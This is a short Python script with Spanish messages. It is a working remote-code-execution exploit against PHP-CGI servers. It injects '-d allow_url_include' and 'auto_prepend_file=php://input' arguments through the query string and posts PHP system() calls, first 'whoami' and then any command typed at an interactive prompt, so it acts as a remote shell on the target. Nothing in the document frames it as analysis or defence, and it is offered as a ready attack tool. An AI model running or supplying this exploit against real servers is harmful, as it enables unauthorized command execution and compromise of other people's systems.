#!/usr/bin/env python
#_*_ coding: utf8 _*_

import requests
import argparse


parser = argparse.ArgumentParser()
parser.add_argument('-t','--target',help="Objetivo")
parser = parser.parse_args()


def main():
	if parser.target:
		vuln = "/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
		target = parser.target
		if not target.startswith('http://'):
			target = 'http://'+target
		try:
			exp = requests.post(target+vuln,"<?php system('whoami'); die(); ?>")
			user = exp.text
			user = user.replace("\n","")
			try:
				while True:
					command = raw_input("{}$: ".format(user))
					exp = requests.post(target+vuln,"<?php system('{}'); die(); ?>".format(command))
					print(exp.text)
			except KeyboardInterrupt:
				sys.exit(0)
		except:
			print("Fallo al conectar con el objetivo")
	else:
		print("Falta un objetivo")

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		exit()